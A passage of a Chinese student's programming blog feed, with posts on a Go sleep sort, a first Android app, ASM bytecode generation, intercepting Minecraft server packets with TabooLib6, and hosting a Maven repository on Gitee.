        <content type="html"><![CDATA[<h1 id="格-局-打-开"><a href="#格-局-打-开" class="headerlink" title="格 局 打 开"></a>格 局 打 开</h1><p>今天见识到了大佬的牛逼睡排</p><p>这个思路震撼到我了，我第一次见识到这种排序方法。虽然是很久以前就有的算法，但是第一次见识到我还是被震惊到了。</p><p>再配合上go的协程来实现这个功能，真是妙极了！短短15行代码，让我如醍醐灌顶</p><p>我超，这就是同年级的卷王，这位更是红岩之光</p><p>代码（不是大佬的代码，是我按照他的代码自己码了一遍，跟大佬代码有部分出入)</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 从真正的大佬那里抄来的代码</span><span class="token comment">// 睡排，开睡！</span><span class="token comment">// 虽然确实是一种非常棒的思路，但由于数字差距较小时较容易产生误差，所以在这里并不太实用</span><span class="token comment">// 或者...我们可以牺牲更多的排序时间来换取它的精确性,即把元睡眠时间增大</span><span class="token keyword">func</span> <span class="token function">sortSleep</span><span class="token punctuation">(</span>origin <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span> <span class="token punctuation">{</span><span class="token comment">// 不初始化也可以append</span><span class="token keyword">var</span> edited <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroupwg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> origin <span class="token punctuation">{</span><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span>num <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Millisecond <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// 这里如果改为一百，结果就非常准确了，但如果是10，还是非常容易产生误差</span>edited <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>edited<span class="token punctuation">,</span> num<span class="token punctuation">)</span>wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span>wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> edited<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>草，发明睡眠排序的那个人，真寄吧是个天才</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coroutine </tag>
            
            <tag> 算法 </tag>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开发了第一个自己的安卓软件</title>
      <link href="/2021/10/15/my-first-android-application/"/>
      <url>/2021/10/15/my-first-android-application/</url>
      
        <content type="html"><![CDATA[<p>安卓开发的书看了不少了，我却鲜有实践。于是今天我决定尝试一下，于是就有了它 <a href="https://github.com/ColdRain-Moro/RegexTesterAndroid">ColdRain-Moro/RegexTesterAndroid: 我的第一个安卓程序 (github.com)</a></p><p>我写的程序太多了，但它也许是其中唯一一个够格被称之为软件的程序，因为它可以独立运行，并且具有一定的有意义的功能，并且有还算能看的UI界面。（虽然它的代码量非常的少）我以前做的Minecraft插件开发其实都只是对于Minecraft服务端功能的修改罢了。</p><p>其实我不是很喜欢Android这种用xml来做ui布局的做法 （感觉…不如html+css），所幸Android Studio提供了便捷的UI编辑工具。Jetpack Compose才是最合我口味的ui编辑方式，就是我凭我现在的能力也许还不足以能掌握它。</p><p>总之，先老老实实学点基础吧，好高骛远也不是件好事</p><p><a href="https://camo.githubusercontent.com/323eccd940618f7f7dc6deaf6b8f3fe43cb052597f3369fb2e7d9684dca903c6/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465722e706e67"><img src="https://camo.githubusercontent.com/323eccd940618f7f7dc6deaf6b8f3fe43cb052597f3369fb2e7d9684dca903c6/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465722e706e67" alt="regextester"></a></p><p><a href="https://camo.githubusercontent.com/bfcac0a18ebee0c5aa1f20e4641b7d77880f423ebe1647df51281f35fb109845/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465725f312e706e67"><img src="https://camo.githubusercontent.com/bfcac0a18ebee0c5aa1f20e4641b7d77880f423ebe1647df51281f35fb109845/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465725f312e706e67" alt="regextester_1"></a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进入大学后一段时间的总结</title>
      <link href="/2021/10/14/enter-college/"/>
      <url>/2021/10/14/enter-college/</url>
      
        <content type="html"><![CDATA[<h1 id="进入大学后一段时间的总结"><a href="#进入大学后一段时间的总结" class="headerlink" title="进入大学后一段时间的总结"></a>进入大学后一段时间的总结</h1><p>我过得很充实，很快乐。因为这段时间我选择了跟舍友的王者之路截然不同的一条荆棘之路，我能切身切实的感受的我技术的成长。甚至还用自己刚学两天的前端知识写了一个个人主页🤣</p><h2 id="我的学习计划"><a href="#我的学习计划" class="headerlink" title="我的学习计划"></a>我的学习计划</h2><p>进入大学以来，我能接触到的知识越来越多了，将他们在短时间全部学完大概是不可能的。</p><p>并且我也需要确立自己未来的发展方向，把精力用在刀刃上 （不过我现在还没什么头绪）</p><p>姑且先理一下现在要学的知识吧</p><h3 id="Schedule"><a href="#Schedule" class="headerlink" title="Schedule"></a>Schedule</h3><ul><li>Android 开发 &amp; Kotlin -&gt; jetpack compose 的使用 (移动)</li><li>Html/CSS/JavaScript/TypeScript -&gt; Node.js/React (前端)</li><li>Golang (后端)</li><li>AOP-面向切面编程思想</li><li>C++/C#</li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尝试用CSS/Html写了自己的第一个网站</title>
      <link href="/2021/10/12/my-first-web-page/"/>
      <url>/2021/10/12/my-first-web-page/</url>
      
        <content type="html"><![CDATA[<p>因为成为了红岩网校的web前端部门的学员，我学习了一些CSS/Html的知识</p><p>说起来，之所以打算学习前端，是想要写一个自己的个人主页 （当初看见了贺兰的个人主页，觉得逼格颇高，便对此产生了兴趣）</p><p>但我没想到这么快就会迎来实现的一天。当然，跟贺兰那个可能还有些差距，毕竟我只用了CSS/Html。</p><p><a href="https://camo.githubusercontent.com/a4365e6360c95dc52de9c66391ce5d2b35adc31d4c334827e566ce416f0e6766/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f706167652e706e67"><img src="https://camo.githubusercontent.com/a4365e6360c95dc52de9c66391ce5d2b35adc31d4c334827e566ce416f0e6766/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f706167652e706e67" alt="60223956_p0"></a></p><p>总体我还是相当满意的，便用github-pages将它部署了上来。并且coldrain.ink的域名解析到了这个主页上，把之前博客的域名换成了blog.coldrain.ink。</p><p>只学两天便能看到成果，也难怪有人说学html/css比学java这些编程语言更容易坚持下来了</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用ASM写一个HelloWorld</title>
      <link href="/2021/10/11/hello-asm/"/>
      <url>/2021/10/11/hello-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="用ASM写一个HelloWorld"><a href="#用ASM写一个HelloWorld" class="headerlink" title="用ASM写一个HelloWorld"></a>用ASM写一个HelloWorld</h1><p>今天上计算机应用能力课的时候太无聊，简单的研究了一下ASM，用ASM生成了一个含有HelloWorld的类<br>不得不说，ASM是真的黑魔法</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">public</span> <span class="token keyword">class</span> ASMTest <span class="token punctuation">{</span>    <span class="token keyword">public</span> static void <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> throws NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        byte<span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        MyClassLoader cl <span class="token operator">=</span> new <span class="token function">MyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> clazz <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token string">"team.redrock.coldrain.asmtest.HelloWorldASM"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        Method m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>class<span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> new Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>new String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    static byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ClassWriter cw <span class="token operator">=</span> new <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cw<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>V1_8<span class="token punctuation">,</span> Opcodes<span class="token punctuation">.</span>ACC_PUBLIC<span class="token punctuation">,</span> <span class="token string">"team/redrock/coldrain/asmtest/HelloWorldASM"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"java/lang/Object"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        MethodVisitor mv <span class="token operator">=</span> cw<span class="token punctuation">.</span><span class="token function">visitMethod</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>ACC_PUBLIC <span class="token operator">+</span> Opcodes<span class="token punctuation">.</span>ACC_STATIC<span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"([Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitFieldInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>GETSTATIC<span class="token punctuation">,</span> <span class="token string">"java/lang/System"</span><span class="token punctuation">,</span> <span class="token string">"out"</span><span class="token punctuation">,</span> <span class="token string">"Ljava/io/PrintStream;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitLdcInsn</span><span class="token punctuation">(</span><span class="token string">"Hello ASM!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitMethodInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>INVOKEVIRTUAL<span class="token punctuation">,</span> <span class="token string">"java/io/PrintStream"</span><span class="token punctuation">,</span> <span class="token string">"println"</span><span class="token punctuation">,</span> <span class="token string">"(Ljava/lang/String;)V"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitInsn</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitMaxs</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mv<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cw<span class="token punctuation">.</span><span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> cw<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    static <span class="token keyword">class</span> MyClassLoader extends ClassLoader <span class="token punctuation">{</span>        <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 外部库 </tag>
            
            <tag> ASM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用TabooLib6发送/拦截/修改数据包以实现梦想中的特性</title>
      <link href="/2021/09/28/taboolib6-packet-control/"/>
      <url>/2021/09/28/taboolib6-packet-control/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在如今的插件开发者社区中，利用NMS底层的数据包功能实现一些游戏特性已经不再稀奇。例如坏黑大佬的Adyeshach和Arasple的TrMenu，它们的功能全部依靠数据包实现。</p><p>本文将尝试让读者从一定程度上理解数据包，而不是仅仅扔出一段一段的代码…</p><p>由于文章作者很少涉猎1.17版本的插件开发，所以这篇文章的部分内容只对1.16.5及以下版本适用</p><p>由于文章作者是个菜逼，所以部分内容甚至是整片文章对于数据包的论述可能十分片面，大佬轻喷</p><p><strong>文章作者也是菜鸟，文章内容如有谬误烦请各位大佬指正</strong></p><h2 id="从一定程度上理解数据包"><a href="#从一定程度上理解数据包" class="headerlink" title="从一定程度上理解数据包"></a>从一定程度上理解数据包</h2><p>你也许听说过数据包这个东西，但是你真的知道它是什么吗？</p><p>那么你有没有想过，<strong>服务器</strong>是如何控制玩家<strong>客户端</strong>的显示效果的呢？</p><p>答案是向玩家客户端发送数据包，然后客户端按照数据包的内容执行游戏效果。</p><p>举个例子:</p><blockquote><p>玩家因为某种原因扣血了</p><ol><li>服务端将内存中储存的玩家血量修改为扣血后的值</li><li>向客户端发送一个PacketPlayOutUpdateHealth数据包</li><li>客户端按照数据包中的内容修改了玩家屏幕上显示的血量</li></ol></blockquote><p>那么你应该已经想到这个环节我们可以怎么操作了</p><blockquote><p>1.我们自己手动向玩家的客户端发送数据包，让玩家看到假的效果 （比如上面的例子，我们可以给玩家制造一个扣血的“假象”）</p><p>2.我们修改服务端发送的数据包，修改里面的字段，让玩家看到我们想让他们看到的效果 (比如玩家扣了10点血，但是我可以让他看起来只扣了1点血，但是服务端里记录的玩家真实生命值仍然扣除了10点)</p><p>3.拦截数据包，直接让玩家看不到这个效果 （玩家被打了，可玩家客户端上显示没有扣血，实际上扣了）</p></blockquote><h3 id="数据包的命名规则"><a href="#数据包的命名规则" class="headerlink" title="数据包的命名规则"></a>数据包的命名规则</h3><p>每一种数据包都是NMS底层的一个类，他们的位置都在net.minecraft.server.&lt;版本号&gt;这个包下</p><p>我们来拆分一下PacketPlayOutUpdateHealth这个数据包的名称</p><p>Packet(Play)(Out)(UpdateHealth)</p><p>Play: 数据包的发送的四种状态之一 （HandShake, Status, Login, Play）</p><p>Out: Out/In -&gt; Out即为服务端向客户端发送的数据包，In则相反</p><p>UpdateHealth: 这个数据包的作用，这里是指更新玩家客户端的健康状态</p><p>由此我们便大致可以猜测数据包的作用</p><p>当然，如果你不是很确定的话，还是查查<a href="https://wiki.vg/Protocol#Interact_Entity">Protocol - wiki.vg</a>吧</p><h3 id="数据包字段"><a href="#数据包字段" class="headerlink" title="数据包字段"></a>数据包字段</h3><p>在我们通过反编译查看数据包类的内容时，一般我们会发现一些字段。这些字段的字段名一般都是a，b，c之类的字母，我们无法从字段名中推测这个字段的值代表的东西。</p><p>而无论是发包还是修改数据包，我们都必须理解这个数据包的字段所代表的意义才行。</p><p><a href="https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67"><img src="https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67" alt="image-20210928084148586"></a></p><p>一般这种情况下，我们会查阅<a href="https://wiki.vg/Protocol#Interact_Entity">Protocol - wiki.vg</a></p><p><a href="https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67"><img src="https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67" alt="image-20210928084449744"></a></p><p>于是通过查询wiki，我们基本确定了数据包中字段代表的意义 a -&gt; 生命值 b -&gt; 饱食度 c -&gt; 食物饱和度</p><p>请注意，<strong>少数时候反编译出来的字段并不按wiki中表格的顺序排列</strong>（例如PacketPlayOutExperience），你需要结合字段类型来判断字段在wiki上对应的字段</p><p>有时多个字段类型一样，千万要多试。</p><p>虽然wiki是个很方便的东西，但wiki上也不是什么都有的。事实上，有很多数据包的字段，还有一些DataWatcher之类的杂七杂八的东西没有被wiki标注字段名称和Notes。这时候我们不能怕困难，怼着NMS代码啃就完事了！</p><p>Tips: 有针对性的去寻找NMS代码，从跟你想要实现的功能有一定关系的BukkitAPI方法入手，顺藤摸瓜草到CraftBukkit再溯源到NMS</p><h3 id="使用TabooLib6发送-修改-拦截数据包"><a href="#使用TabooLib6发送-修改-拦截数据包" class="headerlink" title="使用TabooLib6发送/修改/拦截数据包"></a>使用TabooLib6发送/修改/拦截数据包</h3><h4 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h4><p>使用TabooLib的牛逼NMS版本控制工具，直接写NMS代码来发送数据包</p><p><strong>接口部分</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">interface</span> NMS <span class="token punctuation">{</span>        <span class="token comment">/**     * 刷新饱食度条     *     * @param p 玩家     */</span>    <span class="token keyword">fun</span> <span class="token function">updateFoodBar</span><span class="token punctuation">(</span>p<span class="token operator">:</span> Player<span class="token punctuation">)</span>    <span class="token keyword">companion</span> <span class="token keyword">object</span> <span class="token punctuation">{</span>        <span class="token comment">// 经过版本控制的实例，可以在任意版本放心使用</span>        <span class="token comment">// 在同一个包下创建一个实现类，取名为&lt;接口名&gt;Impl即可</span>        <span class="token keyword">val</span> handle <span class="token keyword">by</span> lazy <span class="token punctuation">{</span>            nmsProxy<span class="token operator">&lt;</span>NMS<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>实现部分</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> NMSImpl <span class="token operator">:</span> NMS <span class="token punctuation">{</span>        <span class="token comment">// 没错，直接用nms，不用担心版本的问题</span>    <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">updateFoodBar</span><span class="token punctuation">(</span>p<span class="token operator">:</span> Player<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> foodData <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token keyword">as</span> CraftPlayer<span class="token punctuation">)</span><span class="token punctuation">.</span>handle<span class="token punctuation">.</span>foodData        p<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>playerConnection<span class="token punctuation">.</span><span class="token function">sendPacket</span><span class="token punctuation">(</span><span class="token function">PacketPlayOutUpdateHealth</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>scaledHealth<span class="token punctuation">,</span> foodData<span class="token punctuation">.</span>foodLevel<span class="token punctuation">,</span> foodData<span class="token punctuation">.</span>saturationLevel<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="拦截-修改"><a href="#拦截-修改" class="headerlink" title="拦截/修改"></a>拦截/修改</h4><p>TabooLib6将服务器数据包通讯包装为了两个事件，我们直接通过监听这个事件即可实现数据包的拦截与修改</p><p>监听名称中含有Out这个单词的数据包就用PacketSendEvent，In就用PacketReceiveEvent</p><p>接下来我给段实例代码，自己去悟吧</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token annotation builtin">@SubscribeEvent</span><span class="token keyword">fun</span> <span class="token function">e</span><span class="token punctuation">(</span>e<span class="token operator">:</span> PacketSendEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 对数据包类型的判断</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">"PacketPlayOutExperience"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">val</span> v <span class="token operator">=</span> expTempValue<span class="token punctuation">[</span>e<span class="token punctuation">.</span>player<span class="token punctuation">.</span>name<span class="token punctuation">]</span>        <span class="token comment">// 读取数据包中字段的值</span>        <span class="token keyword">val</span> level <span class="token operator">=</span> e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span>read<span class="token operator">&lt;</span>Int<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">)</span>        <span class="token comment">// 将值写入数据包中的字段</span>        e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> v <span class="token operator">?:</span> <span class="token number">0.0f</span><span class="token punctuation">)</span>        e<span class="token punctuation">.</span>packet<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment">// 取消事件，意思是直接把这个数据包拦截下来了</span>        e<span class="token punctuation">.</span>isCancelled <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> TabooLib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Gitee搭建了自己的Maven仓库</title>
      <link href="/2021/09/06/gitee-maven/"/>
      <url>/2021/09/06/gitee-maven/</url>
      
        <content type="html"><![CDATA[<p>鼓捣了一晚上终于弄出来了……</p><p><a href="https://gitee.com/coldrain-moro/maven">maven: 寒雨的maven仓库 (gitee.com)</a></p><p>也算是给自己当初偷懒没去多多了解maven补上了一课，出来混，迟早要还的</p><p>之所以选择gitee而没有选择github当然是因为速度快</p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><h3 id="上传jar到仓库的命令"><a href="#上传jar到仓库的命令" class="headerlink" title="上传jar到仓库的命令"></a>上传jar到仓库的命令</h3><p>像这样写上传了Tiphareth到本地maven仓库里</p><pre class="line-numbers language-none"><code class="language-none">mvn install:install-file -Dfile=E:\ColdRain_Moro\项目\Tiphareth\build\libs\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="改变默认maven仓库路径"><a href="#改变默认maven仓库路径" class="headerlink" title="改变默认maven仓库路径"></a>改变默认maven仓库路径</h3><p>在 settings.xml 中下文标记位置添加如下内容</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>settings</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.2.0<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>          <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- localRepository   | The path to the local repository maven will use to store artifacts.   |   | Default: ${user.home}/.m2/repository  &lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;下面是要添加的内容  --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localRepository</span><span class="token punctuation">&gt;</span></span>E:\ColdRain_Moro\项目\maven\repo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localRepository</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>我一般只用gradle，所以这里只标记gradle的使用方式</p><p><em><strong>gradle yyds</strong></em></p><pre class="line-numbers language-none"><code class="language-none">repositories {    mavenCentral()    // 添加我的仓库    maven { url = uri("https://gitee.com/coldrain-moro/maven/raw/master/repo") }}dependencies {// 导入仓库里的依赖tiphareth    compileOnly("ink.ptms.tiphareth:tiphareth:1.4.0")    compileOnly("public:PlaceholderAPI:2.10.9@jar")    compileOnly("ink.ptms.core:v11605:11605")    compileOnly(kotlin("stdlib"))    compileOnly(fileTree("libs"))}<span aria-hidden="true" 